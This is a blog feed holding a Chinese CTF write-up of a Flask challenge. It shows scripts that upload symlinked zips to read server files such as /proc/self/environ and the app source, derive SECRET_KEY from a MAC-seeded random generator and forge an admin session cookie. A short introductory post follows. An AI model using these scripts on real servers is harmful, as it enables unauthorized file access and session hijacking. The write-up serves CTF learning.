    <content type="html"><![CDATA[<h1 id="一道flask的wp"><a href="#一道flask的wp" class="headerlink" title="一道flask的wp"></a>一道flask的wp</h1><p>本题为校内一个师兄出的题，在本地搭好了环境进行试验。</p><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a><strong>第一步</strong></h2><p>进入题目发现一个上传点和提示“I will tell you a secret, but you should become admin first.”，根据提示可以猜想到得先想办法以admin身份登录，查看cookie可以看到session，值为疑似base64的一串字符串，decode之后为类似{“username”:”2333”}的信息，应该使用的是securecookie机制，如果能够得到签名的key和签名方法等相关信息就能想办法伪造session，接下来的思路是一样的，就是想办法先拿到源码。</p><p><img src="https://i.loli.net/2021/03/02/akT8L3im6Sbphr2.jpg" alt="awp_falsk1.jpg"></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a><strong>第二步</strong></h2><p>测试上传点，发现只能上传zip文件，并返回zip解压后的文件内容。尝试压缩软链接上传，发现会回显对应的文件内容，这样就实现了一个任意文件下载，通过这个可以开始想办法找到源码的路径，我们要用到上传zipfile读取到<code>SECRET_KEY</code>，然后伪造admin的session进行登录。</p><p><img src="https://i.loli.net/2021/03/02/QkSH5WdNi8yUCqE.jpg" alt="awp_falsk2.jpg"></p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>接下来主要目标是获取源码</p><p>脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xxxx/upload&#x27;</span></span><br><span class="line">def makezip():</span><br><span class="line">    os.system(<span class="string">&#x27;ln -s &#x27;</span>+sys.argv[1]+<span class="string">&#x27; exp&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;zip --symlinks exp.zip exp&#x27;</span>)</span><br><span class="line">makezip()</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;the_file&#x27;</span>:open(<span class="string">&#x27;./exp.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">def exploit():</span><br><span class="line">    res = requests.post(url,files=files)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">exploit()</span><br><span class="line">os.system(<span class="string">&#x27;rm -rf exp&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;rm -rf exp.zip&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如果对linux比较了解应该会知道 <code>/proc</code>目录 ，然后通过 <code>/proc/self/environ</code>的软链接 来获得flask的环境变量，环境变量中可以找到配置文件路径和一些信息</p><p><img src="https://i.loli.net/2021/03/02/h5J8X9jNV6Hq4p1.jpg" alt="awp_falsk3.jpg"></p><p>整理一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/<span class="built_in">local</span>/bin/uwsgi</span><br><span class="line">SUPERVISOR_GROUP_NAME=uwsgi</span><br><span class="line">HOSTNAME=5a000ec609dc</span><br><span class="line">PYTHON_PIP_VERSION=20.1</span><br><span class="line">HOME=/root</span><br><span class="line">GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class="line">UWSGI_INI=/app/y0u_found_it.ini</span><br><span class="line">NGINX_MAX_UPLOAD=0</span><br><span class="line">UWSGI_PROCESSES=16</span><br><span class="line">STATIC_URL=/static</span><br><span class="line">PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/1fe530e9e3d800be94e04f6428460fc4fb94f5a9/get-pip.py</span><br><span class="line">UWSGI_CHEAPER=2</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/bin:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">LANG=C.UTF-8</span><br><span class="line">SUPERVISOR_ENABLED=1</span><br><span class="line">PYTHON_VERSION=3.6.10</span><br><span class="line">NGINX_WORKER_PROCESSES=auto</span><br><span class="line">SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock</span><br><span class="line">SUPERVISOR_PROCESS_NAME=uwsgi</span><br><span class="line">LISTEN_PORT=80</span><br><span class="line">STATIC_INDEX=0</span><br><span class="line">PWD=/app/y0u_found_it</span><br><span class="line">PYTHON_GET_PIP_SHA256=ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348</span><br><span class="line">STATIC_PATH=/app/static</span><br><span class="line">PYTHONPATH=/app</span><br><span class="line">UWSGI_RELOADS=0</span><br></pre></td></tr></table></figure><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>扫一眼过去，能够发现一项<code>UWSGI_INI</code>，以INI结尾，应该是个配置文件 ，而且从命名来看</p><p>”y0u_found_it.ini“已经在提示这个ini文件有问题，那么接下来 构造软链接，生成zip，上传读取。<br>得到<code>/app/ y0u_found_it.ini</code>内容</p><p><img src="https://i.loli.net/2021/03/02/v7ilWwXUahBEFoL.jpg" alt="awp_falsk4.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">module = y0u_found_it.y0u_found_it_main</span><br><span class="line">callable=app</span><br></pre></td></tr></table></figure><p>这样就找到了源代码路径<code>/app/y0u_found_it/y0u_found_it_main.py</code></p><p>接下来获取源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], secret=secret.secret)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;ZmxhZw==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">10008</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a><strong>第五步</strong></h2><p>查看代码发现secret=secret.secret，可以知道flag应该是在<code>secret.py</code>文件里，如果软链接直接读取 ，发现还是提示<code>you are not admin</code> ，所以还是得按照前面的分析 通过找<code>SECRET_KEY</code> 来解决，因为 python random生成的数不是真正的随机数，而是伪随机数，利用伪随机数的特性，只要种子是一样的，后面产生的随机数值也是一致的。</p><p>查看代码可知通过<code>uuid.getnode()</code>函数 获取网卡mac地址并转换成十进制数返回 ，那么思路就变成了先获取服务器的网卡mac地址来确定种子，进而确定<code>SECRET_KEY</code>，从而伪造<code>session</code></p><p>因为linux中一切都是文件，所以可以通过读<code>/sys/class/net/eth0/address</code>文件得到mac地址</p><p>然后 把mac地址处理下，转换成10进制，然后设置成seed，生成 <code>SECRET_KEY</code>，下面是脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;mac&quot;</span></span><br><span class="line">sss = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sss = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> sss]</span><br><span class="line">sss = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> sss]</span><br><span class="line">sss = <span class="string">&#x27;&#x27;</span>.join(sss)</span><br><span class="line">mac = <span class="built_in">int</span>(sss,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">print(randStr)</span><br></pre></td></tr></table></figure><p>这里另外一个师傅给出了另外一个简介版本，当时写的时候就觉得上面那个有点复杂了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;mac&quot;</span></span><br><span class="line">sss = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sss = <span class="string">&#x27;&#x27;</span>.join(sss)</span><br><span class="line">mac = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+sss)</span><br><span class="line">print(mac)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a><strong>第六步</strong></h2><p>接下来就是通过key获取admin的session，这里是通过flask-session-cookie-manager脚本获取</p><p><img src="https://i.loli.net/2021/03/02/P4zwVnSjak2ClQ5.jpg" alt="awp_falsk5.jpg"></p><p>session成功伪造，获得flag</p><p><img src="https://i.loli.net/2021/03/02/sz2d16LKrAVwOXZ.jpg" alt="awp_falsk6.jpg"></p><p>exp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">file_name</span>):</span></span><br><span class="line">  link(file_name)</span><br><span class="line">  files = &#123;<span class="string">&#x27;the_file&#x27;</span>: <span class="built_in">open</span>(file_name[-<span class="number">5</span>:] + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">  r2 = s.post(url+<span class="string">&#x27;upload&#x27;</span>, files=files)</span><br><span class="line">  <span class="keyword">return</span> r2.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link</span>(<span class="params">file_name</span>):</span></span><br><span class="line">  os.system(<span class="string">&#x27;ln -s &#123;file_name&#125; &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = file_name, output = file_name[-<span class="number">5</span>:]))</span><br><span class="line">  os.system(<span class="string">&#x27;zip -y -m &#123;output&#125;.zip &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = file_name, output = file_name[-<span class="number">5</span>:]))</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xxxxxx/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> s:</span><br><span class="line">  en = read_file(<span class="string">&#x27;/proc/self/environ&#x27;</span>)</span><br><span class="line">  ini = re.search(<span class="string">&#x27;UWSGI_INI=(.*?)\x00&#x27;</span>, en).group(<span class="number">1</span>)</span><br><span class="line">  pwd = re.search(<span class="string">&#x27;PWD=(.*?)\x00&#x27;</span>, en).group(<span class="number">1</span>)</span><br><span class="line">  ini = read_file(ini)</span><br><span class="line">  source = re.search(<span class="string">&#x27;module = .*?\.(.*?)\n&#x27;</span>, ini).group(<span class="number">1</span>)</span><br><span class="line">  source = pwd+<span class="string">&#x27;/&#x27;</span>+source+<span class="string">&#x27;.py&#x27;</span></span><br><span class="line">  source = read_file(source)</span><br><span class="line">  <span class="keyword">if</span>(source.find(<span class="string">&#x27;import&#x27;</span>) == -<span class="number">1</span>):</span><br><span class="line">​    exit(<span class="string">&#x27;fail&#x27;</span>)</span><br><span class="line">  mac = <span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span></span><br><span class="line">  mac = read_file(mac)</span><br><span class="line">  mac = mac[:-<span class="number">1</span>]</span><br><span class="line">  mac = <span class="string">&#x27;&#x27;</span>.join(mac.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">  mac = <span class="built_in">int</span>(mac, <span class="number">16</span>)</span><br><span class="line">  random.seed(mac)</span><br><span class="line">  key = random.random()*<span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(key)</span><br><span class="line">payload = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">session = serializer.dumps(payload)</span><br><span class="line">cookies = &#123;<span class="string">&#x27;session&#x27;</span>: session&#125;</span><br><span class="line">r = requests.get(url, cookies=cookies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一道flask的wp&quot;&gt;&lt;a href=&quot;#一道flask的wp&quot; class=&quot;headerlink&quot; title=&quot;一道flask的wp&quot;&gt;&lt;/a&gt;一道flask的wp&lt;/h1&gt;&lt;p&gt;本题为校内一个师兄出的题，在本地搭好了环境进行试验。&lt;/p&gt;
&lt;h2 id=</summary>
      
    
    
    
    <category term="web" scheme="http://fxizenta.github.io/categories/web/"/>
    
    
    <category term="flask" scheme="http://fxizenta.github.io/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>Hello</title>
    <link href="http://fxizenta.github.io/2021/01/24/hello-world/"/>
    <id>http://fxizenta.github.io/2021/01/24/hello-world/</id>
    <published>2021-01-23T16:00:00.000Z</published>
    <updated>2021-03-15T10:58:21.520Z</updated>
    
    <content type="html"><![CDATA[<p>本博客创建于2021年1月24日，因在竞赛学习中感觉到学到的知识遗忘的过快，于是决定建立此博客，用于分享以及记录学习笔记。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本博客创建于2021年1月24日，因在竞赛学习中感觉到学到的知识遗忘的过快，于是决定建立此博客，用于分享以及记录学习笔记。&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
